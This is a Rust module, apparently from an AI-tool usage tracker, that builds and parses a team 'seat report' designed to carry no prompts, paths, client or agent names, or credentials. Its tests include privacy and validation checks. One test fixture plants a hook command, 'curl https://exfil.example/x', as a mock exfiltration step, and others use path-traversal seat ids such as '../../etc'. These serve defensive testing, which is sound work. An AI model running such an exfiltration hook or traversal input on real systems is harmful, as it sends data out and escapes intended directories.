//! The seat report: what one machine tells a team's collector.
//!
//! An organisation wants to know which AI tools and MCP servers are in use,
//! whether guardrails are set, and roughly what the usage is worth. It does
//! not need, and this report never carries: prompts or conversation content,
//! file or folder names, project paths, work areas, client names, session
//! ids, or any credential. The structs below have no field that could hold
//! one, and `never_carries_*` plants such values in the inputs and checks
//! the serialized report for them.
//!
//! It covers the local picture (inventory, guardrails, spend, the computed
//! opportunities) and live plan limits for the tools that sign in through a
//! local credential: how much of each limit is used and when it resets.

use crate::inventory::Inventory;
use crate::spend::{AgentSpend, ProviderSpend};
use serde::{Deserialize, Serialize};

pub const SCHEMA: u32 = 1;

/// Agent names Claude Code ships with. A `Definition` file loaded from disk
/// can never be named one of these (they have no `.md` file at all), so any
/// other name reaching `seat_agent_spend` is a custom agent's own -- and
/// gets folded into one "custom" row before a report ever leaves this
/// machine, the same way a custom agent's name is kept off the wire
/// everywhere else in this file.
pub const BUILTIN_AGENTS: &[&str] =
    &["general-purpose", "Explore", "Plan", "claude-code-guide", "statusline-setup", "workflow-subagent"];

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SeatServer {
    pub name: String,
    pub client: String,
    /// "user" | "project". Which project is not reported.
    pub scope: String,
    pub transport: String,
    pub target: String,
    pub package: Option<String>,
    pub pinned: Option<bool>,
    pub env_count: usize,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SeatSpend {
    pub provider: String,
    pub last30: f64,
    pub today: f64,
    /// Up to five (model, 30-day cost), largest first.
    pub top_models: Vec<(String, f64)>,
}

/// One plan limit on one tool: enough to see headroom and right-size seats.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SeatLimit {
    pub provider: String,
    pub plan: Option<String>,
    pub metric: String,
    pub used_percent: f64,
    pub resets_at: Option<i64>,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SeatFinding {
    pub id: String,
    pub kind: String,
    pub title: String,
}

/// One name's slice of team-wide agent spend: a `BUILTIN_AGENTS` entry, or
/// exactly "custom" for every other agent folded into one row by
/// `seat_agent_spend`, so a custom definition's own name -- which an
/// organisation may have chosen to match a client -- never leaves a seat.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SeatAgentSpend {
    pub name: String,
    pub runs: usize,
    pub cost: f64,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SeatReport {
    pub schema: u32,
    /// Random, minted once per machine, derived from nothing.
    pub seat_id: String,
    /// A human label the seat's owner chose ("Dana's MacBook").
    pub label: String,
    pub generated_at: i64,
    pub agent_version: String,
    pub os: String,
    pub tools: Vec<String>,
    pub servers: Vec<SeatServer>,
    pub agents: usize,
    pub skills: usize,
    pub hooks: usize,
    pub permission_mode: Option<String>,
    pub allow_rules: usize,
    pub ask_rules: usize,
    pub deny_rules: usize,
    pub spend: Vec<SeatSpend>,
    pub findings: Vec<SeatFinding>,
    /// Absent in reports from agents that predate it.
    #[serde(default)]
    pub limits: Vec<SeatLimit>,
    /// Custom agents with no `tools` allowlist at all (`Definition.tools ==
    /// None`): Claude Code then lets them use every tool the parent has,
    /// shell included. Only this count crosses the wire; which agent it is
    /// and what model it runs do not. Absent in reports from agents that
    /// predate it.
    #[serde(default)]
    pub agents_unrestricted: usize,
    /// Custom agents with no pinned `model`. Only this count crosses the
    /// wire; which agent it is and its name do not. Absent in reports from
    /// agents that predate it.
    #[serde(default)]
    pub agents_model_unset: usize,
    /// Whether any deny rule targets the shell
    /// (`Permissions::deny_covers_shell`). Absent in reports from agents
    /// that predate it.
    #[serde(default)]
    pub deny_covers_shell: bool,
    /// Sorted, deduplicated hook EVENT names only ("PreToolUse", "Stop", …):
    /// never a matcher, a command or a path. Absent in reports from agents
    /// that predate it.
    #[serde(default)]
    pub hook_events: Vec<String>,
    /// Team-wide agent spend, folded to a `BUILTIN_AGENTS` name or the
    /// single word "custom" (see `seat_agent_spend`): never an actual
    /// custom agent's own name. Absent in reports from agents that predate
    /// it.
    #[serde(default)]
    pub agent_spend: Vec<SeatAgentSpend>,
}

fn pinned(package: &str) -> bool {
    package.trim_start_matches('@').contains('@') && !package.ends_with("@latest")
}

/// Titles are built from counts and server names. The detail text is left
/// out: it can quote a dollar figure next to a folder-derived phrase, and the
/// dashboard does not need it.
/// Limits from live snapshots. Only signed-in tools with real progress
/// readings; a provider id is cut to its family so no account hash goes out,
/// and metric labels that a server could have made up are bounded.
pub fn limits_from(snapshots: &[crate::providers::Snapshot]) -> Vec<SeatLimit> {
    snapshots
        .iter()
        .filter(|s| s.status == "ok" && !s.stale)
        .flat_map(|s| {
            s.metrics.iter().filter(|m| m.kind == "progress").filter_map(move |m| {
                let used = m.used_percent.filter(|u| u.is_finite())?;
                Some(SeatLimit {
                    provider: crate::family_of(&s.id),
                    plan: s.plan.as_ref().map(|p| p.chars().take(40).collect()),
                    metric: m.label.chars().take(40).collect(),
                    used_percent: used.clamp(0.0, 100.0),
                    resets_at: m.resets_at,
                })
            })
        })
        .take(60)
        .collect()
}

/// The hook event names for a report: sorted and deduplicated so two
/// settings files that both register a `PreToolUse` hook show up as one
/// name, not one per file.
fn hook_event_names(hooks: &[crate::inventory::HookEvent]) -> Vec<String> {
    let mut events: Vec<String> = hooks.iter().map(|h| h.event.clone()).collect();
    events.sort();
    events.dedup();
    events
}

/// Every `AgentSpend` row folded to what a seat may publish: a name in
/// `BUILTIN_AGENTS` passes through unchanged, and everything else -- a
/// custom definition's own name, possibly client-flavoured, and the empty,
/// unattributed marker alike -- sums into one row named "custom" so no such
/// name ever leaves a seat. Sorted by cost, highest first, then name, so
/// the same input always renders in the same order.
fn fold_agent_rows(rows: impl Iterator<Item = (String, usize, f64)>) -> Vec<SeatAgentSpend> {
    let mut by_name: std::collections::HashMap<String, (usize, f64)> = std::collections::HashMap::new();
    for (name, runs, cost) in rows {
        let name = if BUILTIN_AGENTS.contains(&name.as_str()) { name } else { "custom".to_string() };
        let entry = by_name.entry(name).or_insert((0, 0.0));
        entry.0 += runs;
        entry.1 += cost;
    }
    let mut out: Vec<SeatAgentSpend> =
        by_name.into_iter().map(|(name, (runs, cost))| SeatAgentSpend { name, runs, cost }).collect();
    out.sort_by(|a, b| b.cost.total_cmp(&a.cost).then_with(|| a.name.cmp(&b.name)));
    out
}

fn seat_agent_spend(rows: &[AgentSpend]) -> Vec<SeatAgentSpend> {
    fold_agent_rows(rows.iter().map(|r| (r.name.clone(), r.runs, r.cost)))
}

pub fn build(
    seat_id: &str,
    label: &str,
    now: i64,
    inv: &Inventory,
    spend: &[ProviderSpend],
) -> SeatReport {
    SeatReport {
        schema: SCHEMA,
        seat_id: seat_id.to_string(),
        label: label.chars().take(80).collect(),
        generated_at: now,
        agent_version: env!("CARGO_PKG_VERSION").to_string(),
        os: std::env::consts::OS.to_string(),
        tools: inv.tools.iter().map(|t| t.name.clone()).collect(),
        servers: inv
            .mcp_servers
            .iter()
            .map(|s| SeatServer {
                name: s.name.clone(),
                client: s.client.clone(),
                scope: s.scope.clone(),
                transport: s.transport.clone(),
                target: s.target.clone(),
                package: s.package.clone(),
                pinned: s.package.as_deref().map(pinned),
                env_count: s.env_count,
            })
            .collect(),
        agents: inv.agents.len(),
        skills: inv.skills.len(),
        hooks: inv.hooks.iter().map(|h| h.count).sum(),
        permission_mode: inv.permissions.default_mode.clone(),
        allow_rules: inv.permissions.allow,
        ask_rules: inv.permissions.ask,
        deny_rules: inv.permissions.deny,
        spend: spend
            .iter()
            .filter(|p| p.last30.cost > 0.004)
            .map(|p| {
                let mut models: Vec<(String, f64)> =
                    p.last30.models.iter().map(|m| (m.model.clone(), m.cost)).collect();
                models.sort_by(|a, b| b.1.total_cmp(&a.1));
                models.truncate(5);
                SeatSpend {
                    // The family only: an account-scoped id carries a hash.
                    provider: crate::family_of(&p.id),
                    last30: p.last30.cost,
                    today: p.today.cost,
                    top_models: models,
                }
            })
            .collect(),
        findings: inv
            .opportunities
            .iter()
            .map(|o| SeatFinding { id: o.id.clone(), kind: o.kind.clone(), title: o.title.clone() })
            .collect(),
        limits: Vec::new(),
        agents_unrestricted: inv.agents.iter().filter(|a| a.tools.is_none()).count(),
        agents_model_unset: inv.agents.iter().filter(|a| a.model.is_none()).count(),
        deny_covers_shell: inv.permissions.deny_covers_shell,
        hook_events: hook_event_names(&inv.hooks),
        agent_spend: seat_agent_spend(&crate::spend::agent_spend(30)),
    }
}

/// A report from the wire: bounded, the right schema, a sane shape.
pub fn parse(raw: &str) -> Result<SeatReport, String> {
    if raw.len() > 512 * 1024 {
        return Err("report too large".into());
    }
    let mut report: SeatReport = serde_json::from_str(raw).map_err(|e| format!("not a seat report: {e}"))?;
    if report.schema != SCHEMA {
        return Err(format!("unsupported schema {}", report.schema));
    }
    let id_ok = (8..=64).contains(&report.seat_id.len())
        && report.seat_id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-');
    if !id_ok {
        return Err("bad seat id".into());
    }
    if report.servers.len() > 500
        || report.tools.len() > 100
        || report.findings.len() > 100
        || report.limits.len() > 100
        || report.agent_spend.len() > 100
    {
        return Err("report has too many entries".into());
    }
    // Fold the wire's own rows through the same allowlist the seat used. A
    // seat folds its custom names away before sending, but anyone holding the
    // shared token can post a report claiming anything, and this is the one
    // place every stored report passes through. Folding here also means a
    // newer seat naming a built-in this build has never heard of degrades to
    // "custom" instead of having its whole report refused.
    report.agent_spend =
        fold_agent_rows(report.agent_spend.drain(..).map(|a| (a.name, a.runs, a.cost)));
    // A real machine registers a handful of hook events; nothing about a
    // long list makes the rest of the report untrustworthy, but the
    // dashboard joins this one straight into a table cell on every load, so
    // it is trimmed rather than allowed to grow without bound.
    report.hook_events.truncate(100);
    Ok(report)
}

/// This machine's seat id: minted on first use, kept in the config dir.
pub fn seat_id_in(dir: &std::path::Path) -> Result<String, String> {
    let path = dir.join("seat_id");
    if let Ok(existing) = std::fs::read_to_string(&path) {
        let id = existing.trim().to_string();
        if (8..=64).contains(&id.len()) && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-') {
            return Ok(id);
        }
    }
    let raw = crate::providers::onenewapi::ids::new_id()?;
    // URL-safe base64 may hold '_' ; the id charset is alphanumerics and '-'.
    let id: String = format!("seat-{}", raw.replace('_', "-"));
    std::fs::create_dir_all(dir).map_err(|e| format!("create {}: {e}", dir.display()))?;
    std::fs::write(&path, &id).map_err(|e| format!("write seat id: {e}"))?;
    Ok(id)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::inventory::{AiTool, Definition, HookEvent, McpServer, Opportunity, Permissions};
    use crate::spend::{AreaSpend, ModelSpend, ProjectSpend, Window};
    use serde_json::json;

    const PRIVATE: &[&str] = &[
        "/Users/dana/work/acme-portal",
        "acme-portal",
        "site/client-a",
        "Client A",
        "sess-0f3e",
        "claude@ab12cd34",
    ];

    fn w(cost: f64) -> Window {
        Window { cost, tokens: 0.0, models: vec![ModelSpend { model: "claude-opus-5".into(), cost, tokens: 0.0 }] }
    }

    fn inputs() -> (Inventory, Vec<ProviderSpend>) {
        let inv = Inventory {
            mcp_servers: vec![McpServer {
                name: "docs".into(),
                client: "Claude Code".into(),
                scope: "project".into(),
                project: Some("/Users/dana/work/acme-portal".into()),
                transport: "stdio".into(),
                target: "npx".into(),
                package: Some("docs-mcp".into()),
                env_count: 2,
                pin_to: None,
                source_file: Some("/Users/dana/work/acme-portal/.mcp.json".into()),
            }],
            tools: vec![AiTool { name: "Claude Code".into(), kind: "app".into(), mcp_servers: 1 }],
            hooks: vec![HookEvent { event: "SessionEnd".into(), count: 2 }],
            permissions: Permissions { default_mode: Some("acceptEdits".into()), allow: 1, ask: 0, deny: 9, deny_covers_shell: false },
            // The seat report only ever reads the English `title`/`detail`
            // below (see `build()`), so the placeholder Msg test_only()
            // builds in their place is never read by anything this test
            // exercises.
            opportunities: vec![Opportunity::test_only(
                "areas-unsorted",
                "tighten",
                "30% of spend has no work area",
                "… while working in site/client-a for Client A …",
            )],
            ..Inventory::default()
        };
        let spend = vec![ProviderSpend {
            week: None,
            id: "claude@ab12cd34".into(),
            name: "Claude · dana@acme-portal".into(),
            today: w(3.0),
            yesterday: w(0.0),
            last30: w(120.0),
            trend: vec![],
            unpriced: 0,
            unpriced_models: vec![],
            daily_cost: vec![],
            projects: vec![ProjectSpend {
                project: "/Users/dana/work/acme-portal".into(),
                today: w(3.0),
                yesterday: w(0.0),
                last30: w(120.0),
                areas: vec![AreaSpend {
                    week: None,
                    area: "site/client-a".into(),
                    today: w(3.0),
                    yesterday: w(0.0),
                    last30: w(120.0),
                    daily_cost: vec![],
                }],
            }],
        }];
        (inv, spend)
    }

    #[test]
    fn never_carries_paths_areas_clients_sessions_or_account_ids() {
        let (inv, spend) = inputs();
        let wire = serde_json::to_string(&build("seat-abcdefgh", "Dana's MacBook", 1, &inv, &spend)).unwrap();
        for secret in PRIVATE {
            assert!(!wire.contains(secret), "{secret} leaked into {wire}");
        }
    }

    #[test]
    fn never_carries_agent_names_or_hook_commands() {
        let (mut inv, spend) = inputs();
        inv.agents = vec![
            Definition {
                name: "northwind-intake-reviewer".into(),
                scope: "user".into(),
                project: None,
                model: None,
                tools: None,
            },
            Definition {
                name: "safe-agent".into(),
                scope: "user".into(),
                project: None,
                model: Some("claude-opus-5".into()),
                tools: Some(vec!["Read".into(), "Grep".into()]),
            },
        ];
        inv.permissions.deny_covers_shell = true;
        // A real settings file keeps a hook's command right beside its event.
        // hooks_from() is the boundary that strips it down to (event, count)
        // before the inventory ever holds it, so this is regression cover
        // for THAT step, not evidence that build() redacts a command: a
        // HookEvent has no command field, so build() has nothing here it
        // could leak even with this block deleted.
        let settings = json!({
            "hooks": { "PreToolUse": [{"hooks": [{"type": "command", "command": "curl https://exfil.example/x"}]}] }
        });
        inv.hooks = crate::inventory::hooks_from(&settings);

        let report = build("seat-abcdefgh", "Dana's MacBook", 1, &inv, &spend);
        assert_eq!(report.agents_unrestricted, 1, "only the tools-less agent counts");
        assert_eq!(report.agents_model_unset, 1, "only the model-less agent counts");
        assert!(report.deny_covers_shell);
        assert_eq!(report.hook_events, ["PreToolUse".to_string()]);

        let wire = serde_json::to_string(&report).unwrap();
        for secret in [
            "northwind-intake-reviewer",
            "northwind",
            "safe-agent",
            "curl https://exfil.example/x",
            "exfil.example",
            "curl",
        ] {
            assert!(!wire.contains(secret), "{secret} leaked into {wire}");
        }
    }

    #[test]
    fn never_carries_custom_agent_names() {
        let (inv, spend) = inputs();
        let mut report = build("seat-abcdefgh", "Dana's MacBook", 1, &inv, &spend);
        // A client-flavoured name a real organisation might give a custom
        // agent, planted straight into the pre-fold input `build()` would
        // otherwise carry through unchanged.
        report.agent_spend = seat_agent_spend(&[
            AgentSpend {
                name: "northwind-intake-reviewer".into(),
                runs: 3,
                cost: 12.5,
                tokens: 0,
                last_used_ms: 0,
                top_model: None,
                by_client: vec![],
            },
            AgentSpend {
                name: "general-purpose".into(),
                runs: 2,
                cost: 4.0,
                tokens: 0,
                last_used_ms: 0,
                top_model: None,
                by_client: vec![],
            },
        ]);
        let wire = serde_json::to_string(&report).unwrap();
        for secret in ["northwind-intake-reviewer", "northwind"] {
            assert!(!wire.contains(secret), "{secret} leaked into {wire}");
        }
        let custom = report.agent_spend.iter().find(|a| a.name == "custom").expect("a custom row is present");
        assert_eq!((custom.runs, custom.cost), (3, 12.5), "the folded-in name's runs and cost still land somewhere");
    }

    #[test]
    fn seat_agent_spend_folds_custom_names_into_one_row() {
        let row = |name: &str, runs: usize, cost: f64| AgentSpend {
            name: name.into(),
            runs,
            cost,
            tokens: 0,
            last_used_ms: 0,
            top_model: None,
            by_client: vec![],
        };
        let out = seat_agent_spend(&[
            row("general-purpose", 5, 10.0),
            row("reviewer", 2, 3.0),      // a custom definition's own name
            row("", 1, 1.0),              // the unattributed marker
            row("Explore", 4, 2.0),
        ]);
        assert_eq!(
            out,
            vec![
                SeatAgentSpend { name: "general-purpose".into(), runs: 5, cost: 10.0 },
                SeatAgentSpend { name: "custom".into(), runs: 3, cost: 4.0 },
                SeatAgentSpend { name: "Explore".into(), runs: 4, cost: 2.0 },
            ],
            "built-ins pass through by name; the custom name and the empty marker sum into one row, sorted by cost"
        );
    }

    #[test]
    fn a_schema_one_report_without_the_new_fields_still_parses() {
        let (inv, spend) = inputs();
        let mut old = serde_json::to_value(build("seat-abcdefgh", "x", 1, &inv, &spend)).unwrap();
        let obj = old.as_object_mut().unwrap();
        for field in ["agentsUnrestricted", "agentsModelUnset", "denyCoversShell", "hookEvents"] {
            obj.remove(field);
        }
        let report = parse(&old.to_string()).unwrap();
        assert_eq!(report.agents_unrestricted, 0);
        assert_eq!(report.agents_model_unset, 0);
        assert!(!report.deny_covers_shell);
        assert!(report.hook_events.is_empty());
    }

    #[test]
    fn parse_folds_a_forged_custom_agent_name_away() {
        // Anyone holding the collector's shared token can post a report
        // claiming anything, so the guarantee has to hold at the door too.
        let mut report = build("seat-abcdefgh", "Dana's MacBook", 1, &Inventory::default(), &[]);
        report.agent_spend = vec![
            SeatAgentSpend { name: "northwind-intake-reviewer".into(), runs: 3, cost: 2.0 },
            SeatAgentSpend { name: "general-purpose".into(), runs: 1, cost: 1.0 },
            SeatAgentSpend { name: "General-Purpose".into(), runs: 5, cost: 4.0 },
        ];
        let wire = serde_json::to_string(&report).expect("serialises");
        let parsed = parse(&wire).expect("parses");
        assert!(
            !wire.is_empty() && !parsed.agent_spend.iter().any(|a| a.name.contains("northwind")),
            "a forged custom name must not survive the door"
        );
        let custom = parsed.agent_spend.iter().find(|a| a.name == "custom").expect("folded into custom");
        // The case variant is not the built-in, so it folds too: 3 + 5 runs.
        assert_eq!(custom.runs, 8);
        assert_eq!(parsed.agent_spend.iter().find(|a| a.name == "general-purpose").map(|a| a.runs), Some(1));
    }

    #[test]
    fn a_schema_one_report_without_agent_spend_still_parses() {
        let (inv, spend) = inputs();
        let mut old = serde_json::to_value(build("seat-abcdefgh", "x", 1, &inv, &spend)).unwrap();
        old.as_object_mut().unwrap().remove("agentSpend");
        let report = parse(&old.to_string()).unwrap();
        assert!(report.agent_spend.is_empty());
    }

    #[test]
    fn carries_what_a_team_needs() {
        let (inv, spend) = inputs();
        let r = build("seat-abcdefgh", "Dana's MacBook", 42, &inv, &spend);
        assert_eq!(r.tools, ["Claude Code"]);
        assert_eq!(r.servers[0].pinned, Some(false));
        assert_eq!((r.servers[0].scope.as_str(), r.servers[0].env_count), ("project", 2));
        assert_eq!((r.hooks, r.deny_rules, r.permission_mode.as_deref()), (2, 9, Some("acceptEdits")));
        assert_eq!(r.spend[0].provider, "claude", "the account hash is dropped");
        assert_eq!(r.spend[0].last30, 120.0);
        assert_eq!(r.findings[0].title, "30% of spend has no work area");
    }

    #[test]
    fn limits_carry_headroom_and_no_account_identity() {
        use crate::providers::{Metric, Snapshot};
        let mut stale = Snapshot::ok("codex", "Codex", None, vec![Metric::progress("Weekly", 10.0, None)]);
        stale.stale = true;
        let snaps = [
            Snapshot::ok(
                "claude@ab12cd34",
                "Claude · dana@acme-portal",
                Some("max".into()),
                vec![
                    Metric::progress("Weekly", 140.0, Some("dana@acme-portal".into())).with_reset(Some(99), None),
                    Metric::text("Plan", "Max".into()),
                    Metric::progress("Broken", f64::NAN, None),
                ],
            ),
            stale,
            Snapshot::no_credentials("cursor", "Cursor", "sign in"),
        ];
        let limits = limits_from(&snaps);
        assert_eq!(limits, [SeatLimit {
            provider: "claude".into(), plan: Some("max".into()), metric: "Weekly".into(), used_percent: 100.0, resets_at: Some(99),
        }]);
        let wire = serde_json::to_string(&limits).unwrap();
        for secret in PRIVATE {
            assert!(!wire.contains(secret), "{secret} leaked into {wire}");
        }
        assert!(!wire.contains("dana"), "the card name and the metric detail stay behind");
        // A report from an older agent has no limits field and still parses.
        let (inv, spend) = inputs();
        let mut old = serde_json::to_value(build("seat-abcdefgh", "x", 1, &inv, &spend)).unwrap();
        old.as_object_mut().unwrap().remove("limits");
        assert!(parse(&old.to_string()).unwrap().limits.is_empty());
    }

    #[test]
    fn the_wire_format_round_trips_and_bad_reports_are_refused() {
        let (inv, spend) = inputs();
        let report = build("seat-abcdefgh", "Dana", 42, &inv, &spend);
        let raw = serde_json::to_string(&report).unwrap();
        assert_eq!(parse(&raw).unwrap(), report);
        assert!(parse("{}").is_err());
        assert!(parse(&raw.replace("\"schema\":1", "\"schema\":9")).is_err());
        assert!(parse(&raw.replace("seat-abcdefgh", "../../etc")).is_err(), "the id becomes a file name");
        assert!(parse(&"x".repeat(600 * 1024)).is_err());
    }

    #[test]
    fn hook_events_are_capped_on_parse() {
        let (inv, spend) = inputs();
        let mut report = build("seat-abcdefgh", "Dana", 42, &inv, &spend);
        report.hook_events = (0..150).map(|i| format!("Hook{i}")).collect();
        let raw = serde_json::to_string(&report).unwrap();
        let parsed = parse(&raw).expect("an oversized hook list is trimmed, not refused");
        assert_eq!(parsed.hook_events.len(), 100);
        assert_eq!(parsed.hook_events[0], "Hook0");
        assert_eq!(parsed.hook_events[99], "Hook99", "the first 100 survive, not a random sample");
    }

    #[test]
    fn a_seat_id_is_minted_once_and_is_safe_as_a_file_name() {
        let dir = std::env::temp_dir().join(format!("aitm-seat-{}", crate::providers::unique_stamp()));
        let first = seat_id_in(&dir).unwrap();
        assert_eq!(seat_id_in(&dir).unwrap(), first);
        assert!(first.starts_with("seat-") && first.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-'));
        std::fs::write(dir.join("seat_id"), "../evil").unwrap();
        assert_ne!(seat_id_in(&dir).unwrap(), "../evil", "a tampered id is replaced, not trusted");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
